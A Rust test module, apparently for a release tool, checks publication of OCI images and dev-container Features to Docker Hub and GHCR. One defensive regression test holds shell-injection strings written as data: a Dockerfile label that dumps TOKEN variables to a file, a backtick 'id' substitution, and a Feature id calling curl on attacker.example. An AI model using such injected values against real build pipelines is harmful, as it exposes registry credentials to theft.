  *-*) if [ "${FAKE_DRIFT:-}" = "prerelease-aliases" ]; then tags="${tags} ${version%%.*} latest"; fi ;;
  *) tags="${tags} ${version%%.*} latest" ;;
esac
for tag in ${tags}; do
  printf '%s' "${digest}" > "${directory}/${tag}"
done
"#;

        const DOCKERHUB_JOB: &str = "intentional_publish_component_oci_dockerhub";
        const GHCR_JOB: &str = "intentional_publish_component_oci_ghcr";
        const FEATURE_REPOSITORY: &str = "ghcr.io/example-owner/example-repository/example-feature";
        /// Docker Hub repository the fixture publishes to, registry included.
        ///
        /// The registry host is part of the key the harness stores tags under,
        /// so two destinations of one subject never share a namespace and a
        /// scenario that ran both against one registry could not mistake one
        /// for the other.
        const DOCKERHUB_REPOSITORY: &str = "docker.io/example-owner/example-image";

        /// Both destinations resolve one digest, and neither of them built it.
        #[test]
        fn promotes_the_sealed_layout_to_every_destination_under_one_digest() {
            let mut published = BTreeMap::new();
            for (label, job) in [
                ("oci-promote-dockerhub", DOCKERHUB_JOB),
                ("oci-promote-ghcr", GHCR_JOB),
            ] {
                let recipe = Recipe::new(label, job);
                let outcome = recipe.run("1.2.3");
                assert!(
                    outcome.status.success(),
                    "{job} publishes: {}",
                    outcome.stderr
                );
                let observation = outcome.observation();
                assert_eq!(observation.state, ObservationState::Present);
                let destination = observation.destination.as_ref().expect("a destination");
                published.insert(job, destination.digest.clone());
                assert_eq!(
                    destination.digest, outcome.index_digest,
                    "{job} records the digest the sealed layout carries"
                );
                let subject = observation.subject.as_ref().expect("a subject");
                assert_eq!(
                    subject.digest, SUBJECT_DIGEST,
                    "{job} records the digest the build job sealed over its bytes"
                );
                assert_eq!(subject.identity, "example-image");
            }
            let digests = published.values().collect::<BTreeSet<_>>();
            assert_eq!(
                digests.len(),
                1,
                "every destination resolves the same subject digest: {published:?}"
            );
        }

        /// The recipe records the destination its configuration names.
        ///
        /// An observation also carries the triple that says which publication
        /// it describes, and that binding is the recipe's own to get right: a
        /// body writing another unit's or another target's name produces a
        /// document that loads, validates, and describes the wrong thing.
        /// `accept_observation` would reject it at verification time, two
        /// layers away from the recipe that wrote it.
        ///
        /// The triple is therefore compared against the inputs this job's own
        /// verification step is given rather than against the recipe's `env:`.
        /// Comparing it against `env:` would move both sides together: an
        /// `env:` row that stopped carrying the routed value would produce a
        /// wrong observation that still agreed with the row that wrote it.
        #[test]
        fn records_each_destination_under_its_configured_identity() {
            let dockerhub_recipe = Recipe::new("oci-identity-dockerhub", DOCKERHUB_JOB);
            let dockerhub = dockerhub_recipe.run("1.2.3");
            assert_eq!(
                dockerhub
                    .observation()
                    .destination
                    .as_ref()
                    .expect("destination")
                    .identity,
                "example-owner/example-image",
                "the observation records the repository the configuration names, not the reference the client resolved"
            );
            let ghcr_recipe = Recipe::new("oci-identity-ghcr", GHCR_JOB);
            let ghcr = ghcr_recipe.run("1.2.3");
            assert_eq!(
                ghcr.observation()
                    .destination
                    .as_ref()
                    .expect("destination")
                    .identity,
                "example-owner/example-image",
                "an empty GHCR mapping derives its owner from GitHub and its name from the subject"
            );
            // Both deliveries render from one `@RELEASE_UNIT@` substitution, so
            // their agreeing with each other cannot show that either is the
            // release unit an author configured: a constant in that one place
            // moves both. The third anchor is the configuration file itself.
            let configured = configured_release_unit(dockerhub_recipe.workspace.root());
            assert_eq!(
                dockerhub.verified("release-unit"),
                configured,
                "the job verifies the release unit the configuration names"
            );
            for outcome in [&dockerhub, &ghcr] {
                assert_eq!(
                    outcome.observation().release_unit,
                    outcome.verified("release-unit"),
                    "the observation names the release unit its own job verifies"
                );
                assert_eq!(
                    outcome.observation().target,
                    outcome.verified("target"),
                    "the observation names the target its own job verifies"
                );
            }
            assert_ne!(
                dockerhub.verified("target"),
                ghcr.verified("target"),
                "the two destinations verify different targets, so the binding above tells them apart"
            );
        }

        /// A first stable release takes every alias it is entitled to.
        #[test]
        fn advances_every_compatible_alias_for_the_newest_stable_release() {
            let recipe = Recipe::new("oci-alias-newest", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let tags = outcome.tags(DOCKERHUB_REPOSITORY);
            assert_eq!(
                tags.keys().cloned().collect::<Vec<_>>(),
                vec![
                    "1".to_owned(),
                    "1.2".to_owned(),
                    "1.2.3".to_owned(),
                    "latest".to_owned()
                ]
            );
            assert!(tags.values().all(|digest| *digest == outcome.index_digest));
            let aliases = outcome
                .observation()
                .destination_aliases
                .iter()
                .map(|alias| alias.name.clone())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                aliases,
                BTreeSet::from(["latest".to_owned(), "1.2".to_owned(), "1".to_owned()]),
                "every advanced alias is read back and recorded"
            );
        }

        /// A backport advances its own line and moves nothing backward.
        #[test]
        fn never_moves_an_alias_backward_for_a_backport() {
            let recipe = Recipe::new("oci-alias-backport", DOCKERHUB_JOB).seeded(
                DOCKERHUB_REPOSITORY,
                &[
                    ("1.3.0", FOREIGN_DIGEST),
                    ("1.3", FOREIGN_DIGEST),
                    ("1", FOREIGN_DIGEST),
                    ("latest", FOREIGN_DIGEST),
                ],
            );
            let outcome = recipe.run("1.2.4");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let tags = outcome.tags(DOCKERHUB_REPOSITORY);
            assert_eq!(
                tags.get("1.2").map(String::as_str),
                Some(outcome.index_digest.as_str()),
                "the backport's own minor alias advances"
            );
            for held in ["1", "latest"] {
                assert_eq!(
                    tags.get(held).map(String::as_str),
                    Some(FOREIGN_DIGEST),
                    "{held} still resolves the newer release the destination already carried"
                );
            }
        }

        /// A prerelease publishes its exact version and advances nothing stable.
        #[test]
        fn advances_no_stable_alias_for_a_prerelease() {
            let recipe = Recipe::new("oci-alias-prerelease", DOCKERHUB_JOB);
            let outcome = recipe.run("2.0.0-rc.1");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec!["2.0.0-rc.1".to_owned()]
            );
            assert!(outcome.observation().destination_aliases.is_empty());
        }

        /// Major zero has no broad alias to advance.
        #[test]
        fn omits_the_broad_alias_while_the_major_version_is_zero() {
            let recipe = Recipe::new("oci-alias-major-zero", DOCKERHUB_JOB);
            let outcome = recipe.run("0.4.0");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec!["0.4".to_owned(), "0.4.0".to_owned(), "latest".to_owned()]
            );
        }

        /// A destination already holding this version's subject is recovered.
        #[test]
        fn recovers_a_rerun_that_already_published_the_same_subject() {
            let recipe = Recipe::new("oci-rerun", DOCKERHUB_JOB);
            let first = recipe.run("1.2.3");
            assert!(first.status.success(), "{}", first.stderr);
            let second = recipe.run("1.2.3");
            assert!(
                second.status.success(),
                "a rerun recovers: {}",
                second.stderr
            );
            assert_eq!(
                second.observation().state,
                ObservationState::Present,
                "the already published subject is accepted rather than resubmitted"
            );
            assert_eq!(
                first.tags(DOCKERHUB_REPOSITORY),
                second.tags(DOCKERHUB_REPOSITORY)
            );
        }

        /// A destination holding a different subject under this version conflicts.
        #[test]
        fn reports_a_destination_holding_a_different_subject_as_a_conflict() {
            let recipe = Recipe::new("oci-conflict", DOCKERHUB_JOB)
                .seeded(DOCKERHUB_REPOSITORY, &[("1.2.3", FOREIGN_DIGEST)]);
            let outcome = recipe.run("1.2.3");
            assert!(
                outcome.status.success(),
                "the conflict is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(outcome.observation().state, ObservationState::Conflict);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .get("1.2.3")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a conflicting destination is never overwritten"
            );
        }

        /// The published index has to annotate the version the release sealed.
        #[test]
        fn refuses_a_subject_annotating_a_version_the_release_did_not_seal() {
            let recipe = Recipe::new("oci-annotation", DOCKERHUB_JOB);
            let outcome = recipe.run_with_annotation("1.2.3", "1.2.2");
            assert!(
                !outcome.status.success(),
                "a subject annotated with another version fails the publication"
            );
        }

        /// Each selected component is attached, read back, and recorded.
        #[test]
        fn records_every_selected_component_and_nothing_else() {
            let recipe = Recipe::new("oci-components", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let attached = outcome
                .observation()
                .attached_metadata
                .iter()
                .map(|component| (component.kind.to_string(), component.digest.clone()))
                .collect::<BTreeMap<_, _>>();
            assert_eq!(
                attached.get("sbom").map(String::as_str),
                Some(SBOM_DIGEST),
                "the SBOM the packager generated is bound to the published subject"
            );
            assert_eq!(
                attached.get("provenance").map(String::as_str),
                Some(PROVENANCE_DIGEST)
            );
            assert!(attached.contains_key("signature"), "{attached:?}");
            let signed =
                std::fs::read_to_string(outcome.registry.join("signed.log")).expect("signing log");
            assert!(
                signed.contains(&format!("@{}", outcome.index_digest)),
                "the signature is bound to the published digest rather than to a tag: {signed}"
            );
        }

        /// An omitted component is not attached and leaves no record of itself.
        #[test]
        fn omits_only_the_named_component_without_recording_the_omission() {
            let workspace = two_destination_workspace("oci-omit");
            let configuration =
                std::fs::read_to_string(workspace.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace("ghcr: {}", "ghcr: { omit: [ signature ] }");
            workspace.write(".intentional/config.yml", &configuration);
            converge(workspace.root(), WorkflowRole::Publish);
            let document: Value =
                serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                    .expect("workflow parses");
            let components = document["jobs"][GHCR_JOB]["steps"]
                .as_sequence()
                .expect("steps")
                .iter()
                .filter_map(|step| step["env"]["INTENTIONAL_COMPONENTS"].as_str())
                .collect::<Vec<_>>();
            assert_eq!(
                components,
                vec!["sbom provenance"],
                "the omitted component is not among the ones the recipe attaches"
            );
            let omitting = serde_yaml::to_string(&document["jobs"][GHCR_JOB]).expect("job renders");
            assert!(
                !omitting.contains("cosign"),
                "a target that omits its signature installs no signing client: {omitting}"
            );
            assert!(
                !omitting.contains("omit") && !omitting.contains("waiv"),
                "nothing in the omitting target's job records that a component was omitted"
            );
            let peer =
                serde_yaml::to_string(&document["jobs"][DOCKERHUB_JOB]).expect("job renders");
            assert!(
                peer.contains("cosign"),
                "the omission applies to its own target and to no peer"
            );
        }

        /// Credentials are named, never valued, and each target names its own.
        #[test]
        fn names_the_credentials_each_destination_authenticates_with() {
            let conventional = Recipe::new("oci-credentials", DOCKERHUB_JOB);
            let step = publish_step(
                conventional.workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
            );
            assert_eq!(
                step.env
                    .get("INTENTIONAL_REGISTRY_USER")
                    .map(String::as_str),
                Some("example-account"),
                "Docker Hub reads its account from the conventional variable"
            );
            assert_eq!(
                step.env
                    .get("INTENTIONAL_REGISTRY_TOKEN")
                    .map(String::as_str),
                Some("example-token")
            );

            let ghcr = Recipe::new("oci-credentials-ghcr", GHCR_JOB);
            let step = publish_step(
                ghcr.workspace.root(),
                GHCR_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
            );
            assert_eq!(
                step.env
                    .get("INTENTIONAL_REGISTRY_TOKEN")
                    .map(String::as_str),
                Some("example-github-token"),
                "GHCR authenticates with the scoped workflow token"
            );
            let jobs = publish_jobs(ghcr.workspace.root());
            let permissions = &jobs[&Value::String(GHCR_JOB.to_owned())]["permissions"];
            assert_eq!(permissions["packages"].as_str(), Some("write"));
            assert_eq!(permissions["contents"].as_str(), Some("read"));

            let overridden = two_destination_workspace("oci-credential-overrides");
            let configuration =
                std::fs::read_to_string(overridden.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace(
                        "dockerhub: { repository: example-owner/example-image }",
                        "dockerhub:\n        repository: example-owner/example-image\n        username-var: EXAMPLE_ACCOUNT_VAR\n        token-secret: EXAMPLE_TOKEN_SECRET",
                    );
            overridden.write(".intentional/config.yml", &configuration);
            converge(overridden.root(), WorkflowRole::Publish);
            let derived = serde_yaml::to_string(
                &publish_jobs(overridden.root())[&Value::String(DOCKERHUB_JOB.to_owned())],
            )
            .expect("job renders");
            assert!(
                derived.contains("vars.EXAMPLE_ACCOUNT_VAR")
                    && derived.contains("secrets.EXAMPLE_TOKEN_SECRET"),
                "an overridden credential name is what the job reads: {derived}"
            );
            assert!(
                !derived.contains("DOCKERHUB_USERNAME") && !derived.contains("DOCKERHUB_TOKEN"),
                "the conventional names are replaced rather than added to"
            );
        }

        /// A destination's own digest has to address its own bytes.
        #[test]
        fn refuses_a_destination_whose_digest_is_not_the_bytes_it_serves() {
            let recipe = Recipe::new("oci-push-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "push");
            assert!(
                !outcome.status.success(),
                "a destination naming one subject and serving another fails the publication"
            );
        }

        /// The destination has to hold the content the release sealed.
        ///
        /// A registry re-serializes the index it is given, so the recipe cannot
        /// compare the index digest. What it compares is the set of manifests
        /// the published index references, which a registry carries through
        /// unchanged -- and which is what "the same subject" means across two
        /// destinations that were each handed the same layout.
        #[test]
        fn refuses_a_destination_indexing_manifests_the_release_did_not_seal() {
            let recipe = Recipe::new("oci-content-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "content");
            assert!(
                !outcome.status.success(),
                "an index referencing other manifests is not the sealed subject"
            );
        }

        /// The destination has to publish the name the release sealed.
        #[test]
        fn refuses_a_subject_published_under_another_name() {
            let recipe = Recipe::new("oci-title-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "title");
            assert!(
                !outcome.status.success(),
                "a subject annotated with another name fails the publication"
            );
        }

        /// An alias only moves when the released version is the newest in its line.
        #[test]
        fn never_advances_a_minor_alias_a_newer_patch_already_holds() {
            let recipe = Recipe::new("oci-alias-superseded", DOCKERHUB_JOB).seeded(
                DOCKERHUB_REPOSITORY,
                &[("1.2.4", FOREIGN_DIGEST), ("1.2", FOREIGN_DIGEST)],
            );
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            assert_eq!(
                outcome
                    .tags(DOCKERHUB_REPOSITORY)
                    .get("1.2")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a superseded patch does not take its own minor alias"
            );
            assert!(
                outcome.observation().destination_aliases.is_empty(),
                "an alias that did not move is not recorded as one that did"
            );
        }

        /// An alias that resolves something else was not a promotion.
        #[test]
        fn refuses_an_alias_that_did_not_move_to_the_published_subject() {
            let recipe = Recipe::new("oci-alias-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "alias");
            assert!(
                !outcome.status.success(),
                "an alias resolving another subject fails the publication"
            );
        }

        /// A public client that retrieved other bytes proves nothing.
        #[test]
        fn refuses_a_public_retrieval_that_resolved_another_subject() {
            let recipe = Recipe::new("oci-public-drift", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "public");
            assert!(
                !outcome.status.success(),
                "a consumer path resolving another subject fails the publication"
            );
        }

        /// A selected component the destination does not hold is a failure.
        #[test]
        fn refuses_a_selected_component_the_destination_does_not_hold() {
            let recipe = Recipe::new("oci-missing-component", DOCKERHUB_JOB);
            let outcome = recipe.run_unattested("1.2.3");
            assert!(
                !outcome.status.success(),
                "a component this target still selects cannot quietly leave the evidence"
            );
        }

        /// A subject the derivation cannot name never reaches a destination.
        #[test]
        fn refuses_to_derive_a_publication_whose_subject_it_cannot_name() {
            let unnamed = two_destination_workspace("oci-unnamed-image");
            unnamed.write("component/Dockerfile", "FROM scratch\n");
            let comparison =
                compare_workflow(unnamed.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            assert!(
                comparison.diagnostics.iter().any(|diagnostic| {
                    diagnostic.code == "subject-identity-invalid"
                        && diagnostic.message.contains(OCI_TITLE_LABEL)
                }),
                "{:?}",
                comparison.diagnostics
            );

            let feature = feature_workspace("oci-unnamed-feature");
            feature.write(
                "component/devcontainer-feature.json",
                r#"{"version":"1.2.3"}"#,
            );
            let comparison =
                compare_workflow(feature.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            assert!(
                comparison
                    .diagnostics
                    .iter()
                    .any(|diagnostic| diagnostic.code == "subject-identity-invalid"),
                "{:?}",
                comparison.diagnostics
            );
        }

        /// A source-declared name never becomes executable text.
        ///
        /// The reproduction is the reviewer's: a crafted label that closed the
        /// quoting of the observation's `printf` and exfiltrated the registry
        /// token while the recipe still exited 0. It is kept as a refusal at
        /// derivation, and as a positive proof that the value the body reads
        /// comes from the environment rather than from the source text.
        #[test]
        fn never_lets_a_source_declared_name_reach_a_credentialed_shell() {
            for crafted in [
                "alt'; env | grep TOKEN > /loot; #",
                "a`id`b",
                "Example Image",
                "UPPER",
                "trailing-",
            ] {
                let workspace = two_destination_workspace("oci-injection");
                workspace.write(
                    "component/Dockerfile",
                    &format!("FROM scratch\nLABEL org.opencontainers.image.title=\"{crafted}\"\n"),
                );
                let comparison =
                    compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("runs");
                assert_eq!(
                    comparison.status,
                    ComparisonStatus::Blocked,
                    "{crafted:?} is not an OCI repository name"
                );
                assert!(
                    comparison
                        .diagnostics
                        .iter()
                        .any(|diagnostic| diagnostic.code == "subject-identity-invalid"),
                    "{:?}",
                    comparison.diagnostics
                );
            }

            let feature = feature_workspace("oci-injection-feature");
            feature.write(
                "component/devcontainer-feature.json",
                r#"{"id":"f'; curl https://attacker.example; #","version":"1.2.3"}"#,
            );
            assert_eq!(
                compare_workflow(feature.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a Feature id is source too, and is held to the same grammar"
            );

            // The grammar is the boundary, and the body still reads the value
            // from the environment rather than from its own source text, so a
            // name that passes the grammar is not spliced either.
            let accepted = Recipe::new("oci-identity-routed", DOCKERHUB_JOB);
            let step = publish_step(
                accepted.workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
            );
            assert_eq!(
                step.env
                    .get("INTENTIONAL_SUBJECT_IDENTITY")
                    .map(String::as_str),
                Some("example-image"),
                "the identity reaches the body through env like every other value"
            );
            assert!(
                !step.run.contains("example-image"),
                "and never as text in the body itself: {}",
                step.run
            );
            let jobs = publish_jobs(accepted.workspace.root());
            let build_step = jobs[&Value::String("intentional_build_component_buildx".to_owned())]
                ["steps"]
                .as_sequence()
                .expect("steps")
                .iter()
                .find(|step| {
                    step["name"]
                        .as_str()
                        .is_some_and(|name| name.starts_with("Build the"))
                })
                .expect("the build job builds the subject");
            let build = serde_yaml::to_string(build_step).expect("build step renders");
            assert!(
                build.contains("INTENTIONAL_SUBJECT_IDENTITY: example-image")
                    && build.contains("${INTENTIONAL_SUBJECT_IDENTITY}"),
                "the annotation reads the routed value rather than splicing it: {build}"
            );
        }

        /// A multi-stage build is named after the stage it ships.
        #[test]
        fn names_the_image_after_the_stage_the_release_ships() {
            let workspace = two_destination_workspace("oci-multi-stage");
            workspace.write(
                "component/Dockerfile",
                "FROM scratch AS builder\nLABEL org.opencontainers.image.title=\"builder-image\"\nFROM scratch\nLABEL org.opencontainers.image.title=\"example-image\"\n",
            );
            converge(workspace.root(), WorkflowRole::Publish);
            let step = publish_step(
                workspace.root(),
                DOCKERHUB_JOB,
                Path::new("/runner-temp"),
                "1.2.3",
            );
            assert_eq!(
                step.env
                    .get("INTENTIONAL_SUBJECT_IDENTITY")
                    .map(String::as_str),
                Some("example-image"),
                "the final stage's label is the one the image carries"
            );
        }

        /// A label the build resolves is not a name the source declares.
        #[test]
        fn reads_only_a_literal_image_name_from_the_dockerfile() {
            let workspace = two_destination_workspace("oci-argument-image");
            workspace.write(
                "component/Dockerfile",
                "FROM scratch\nARG NAME\nLABEL org.opencontainers.image.title=$NAME\n",
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a name resolved at build time is not the name the release seals"
            );

            workspace.write(
                "component/Dockerfile",
                "FROM scratch\nLABEL maintainer=\"example\" \\\n      org.opencontainers.image.title=\"example-image\"\n",
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Different,
                "a continued LABEL statement still declares the name"
            );
        }

        /// A Feature is promoted through its native client and its native aliases.
        #[test]
        fn publishes_a_dev_container_feature_through_its_native_client() {
            let recipe = Recipe::feature("oci-feature");
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let observation = outcome.observation();
            let subject = observation.subject.as_ref().expect("a subject");
            assert_eq!(
                subject.identity, FEATURE_ID,
                "the Feature names itself, so the derivation reads that name"
            );
            assert_eq!(subject.kind, "dev-container-feature");
            let aliases = observation
                .destination_aliases
                .iter()
                .map(|alias| alias.name.clone())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                aliases,
                BTreeSet::from(["latest".to_owned(), "1.2".to_owned(), "1".to_owned()]),
                "the aliases its own client maintains are read back and recorded"
            );
        }

        /// A Feature the client would overwrite is a conflict, not a publication.
        #[test]
        fn reports_a_feature_destination_holding_another_subject_as_a_conflict() {
            let recipe = Recipe::feature("oci-feature-conflict")
                .seeded(FEATURE_REPOSITORY, &[("1.2.3", FOREIGN_DIGEST)]);
            let outcome = recipe.run("1.2.3");
            assert!(
                outcome.status.success(),
                "the conflict is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(outcome.observation().state, ObservationState::Conflict);
            assert_eq!(
                outcome
                    .tags(FEATURE_REPOSITORY)
                    .get("1.2.3")
                    .map(String::as_str),
                Some(FOREIGN_DIGEST),
                "a native client is never handed a destination it would overwrite"
            );
        }

        /// A native client that moved a stable alias it should not have fails.
        #[test]
        fn refuses_a_feature_whose_client_advanced_a_stable_alias_for_a_prerelease() {
            let recipe = Recipe::feature("oci-feature-prerelease");
            let outcome = recipe.run_with_drift("2.0.0-rc.1", "prerelease-aliases");
            assert!(
                !outcome.status.success(),
                "an alias resolving a prerelease is a publication failure, not an empty alias list"
            );
        }

        /// A destination no public client can reach reports itself.
        #[test]
        fn reports_a_destination_no_public_client_can_retrieve() {
            let recipe = Recipe::new("oci-private", DOCKERHUB_JOB);
            let outcome = recipe.run_with_drift("1.2.3", "private");
            assert!(
                outcome.status.success(),
                "the destination is reported through the observation: {}",
                outcome.stderr
            );
            assert_eq!(
                outcome.observation().state,
                ObservationState::Pending,
                "the publication was accepted; what has not happened is it becoming observable"
            );
            assert!(
                outcome.stderr.contains("public client"),
                "the step says why, on the run's most likely first outcome: {}",
                outcome.stderr
            );
        }

        /// A prerelease Feature publishes when its client leaves stable aliases alone.
        #[test]
        fn publishes_a_prerelease_feature_that_moved_no_stable_alias() {
            let recipe = Recipe::feature("oci-feature-prerelease-clean");
            let outcome = recipe.run("2.0.0-rc.1");
            assert!(
                outcome.status.success(),
                "a prerelease Feature is publishable: {}",
                outcome.stderr
            );
            assert!(
                outcome.observation().destination_aliases.is_empty(),
                "and it advanced no stable alias"
            );
            assert!(
                outcome.tags(FEATURE_REPOSITORY).contains_key("2.0.0-rc"),
                "the client's own truncation of a prerelease is not an alias the rules govern"
            );
        }

        /// A Feature cannot be told to publish somewhere its client will not.
        #[test]
        fn refuses_a_feature_repository_its_client_would_ignore() {
            let workspace = feature_workspace("oci-feature-override");
            let configuration =
                std::fs::read_to_string(workspace.root().join(".intentional/config.yml"))
                    .expect("configuration")
                    .replace("ghcr: {}", "ghcr: { repository: other-owner/other-name }");
            workspace.write(".intentional/config.yml", &configuration);
            let comparison =
                compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("runs");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            assert!(
                comparison
                    .diagnostics
                    .iter()
                    .any(|diagnostic| diagnostic.code == "destination-not-overridable"),
                "{:?}",
                comparison.diagnostics
            );
        }

        /// A name no destination could resolve is refused before a runner meets it.
        #[test]
        fn refuses_a_subject_name_longer_than_a_registry_admits() {
            let workspace = two_destination_workspace("oci-long-name");
            workspace.write(
                "component/Dockerfile",
                &format!(
                    "FROM scratch\nLABEL org.opencontainers.image.title=\"{}\"\n",
                    "a".repeat(256)
                ),
            );
            assert_eq!(
                compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                    .expect("runs")
                    .status,
                ComparisonStatus::Blocked,
                "a name the distribution specification cannot carry fails at derivation"
            );
        }

        /// A repackage that produced other bytes is not a promotion.
        #[test]
        fn refuses_a_feature_whose_published_bytes_are_not_the_ones_the_build_sealed() {
            let recipe = Recipe::feature("oci-feature-repackaged");
            let outcome = recipe.run_with_drift("1.2.3", "repackage");
            assert!(
                !outcome.status.success(),
                "a destination holding bytes the build job did not produce fails the publication"
            );
        }

        /// The consumer check has to be a consumer check.
        #[test]
        fn retrieves_the_release_with_no_credential_of_its_own() {
            let recipe = Recipe::new("oci-clean-client", DOCKERHUB_JOB);
            let outcome = recipe.run("1.2.3");
            assert!(outcome.status.success(), "{}", outcome.stderr);
            let retrieval = outcome
                .observation()
                .retrieval
                .as_ref()
                .expect("a retrieval");
            assert_eq!(retrieval.digest, outcome.index_digest);
            assert_eq!(retrieval.client, "crane");
            let stores = outcome.retrieval_stores();
            let clean = stores
                .iter()
                .filter(|store| store.contains("clean-client"))
                .collect::<Vec<_>>();
            assert_eq!(
                clean.len(),
                1,
                "one retrieval is performed as a clean client: {stores:?}"
            );
            let store = std::fs::read_dir(clean[0])
                .expect("the clean credential store exists")
                .map(|entry| {
                    entry
                        .expect("entry")
                        .file_name()
                        .to_string_lossy()
                        .into_owned()
                })
                .collect::<BTreeSet<_>>();
            assert!(
                !store.contains("config.json"),
                "the retrieving client is given no credential of its own: {store:?}"
            );
            assert!(
                store.contains("subject.json"),
                "and it retrieved the subject's own bytes rather than only resolving its tag: {store:?}"
            );
        }
    }
}
